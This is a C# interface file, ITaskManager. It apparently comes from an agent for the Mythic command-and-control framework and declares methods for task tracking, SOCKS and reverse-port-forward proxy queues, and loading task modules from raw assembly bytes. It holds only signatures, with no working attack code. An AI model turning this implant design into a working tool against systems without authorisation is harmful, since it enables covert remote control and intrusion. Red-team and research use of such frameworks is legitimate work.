using PhantomInterop.Types.Delegates;
using PhantomInterop.Structs.MythicStructs;
using PhantomInterop.Enums.PhantomEnums;

namespace PhantomInterop.Interfaces
{
    public interface ITaskManager
    {
        string[] GetExecutingTaskIds();
        bool CancelTask(string taskId);

        bool CreateTaskingMessage(OnResponse<TaskingMessage> onResponse);

        bool ProcessMessageResponse(MessageResponse resp);

        void AddTaskResponseToQueue(MythicTaskResponse message);

        void AddDelegateMessageToQueue(DelegateMessage delegateMessage);

        void AddSocksDatagramToQueue(MessageDirection dir, SocksDatagram dg);
        void AddRpfwdDatagramToQueue(MessageDirection dir, SocksDatagram dg);

        bool LoadTaskModule(byte[] taskAsm, string[] commands);
    }
}
